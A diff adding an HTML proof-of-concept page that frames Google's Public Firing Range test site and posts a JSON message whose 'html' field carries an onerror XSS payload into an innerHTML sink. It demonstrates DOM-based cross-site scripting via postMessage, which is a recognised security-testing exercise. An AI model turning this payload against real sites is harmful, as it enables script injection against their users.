@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>postmessage document.write</title>
+</head>
+<body>
+  <iframe id="frame" src="https://public-firing-range.appspot.com/dom/toxicdom/postMessage/innerHtml" frameborder="0"></iframe>
+  <script>
+    const frame = document.querySelector("#frame");
+    frame.onload = () => {
+      const payload = {
+        html: '<img src="1" onerror="alert(1337)">'
+      };
+      frame.contentWindow.postMessage(JSON.stringify(payload), "*");
+    };
+  </script>
+</body>
+</html>
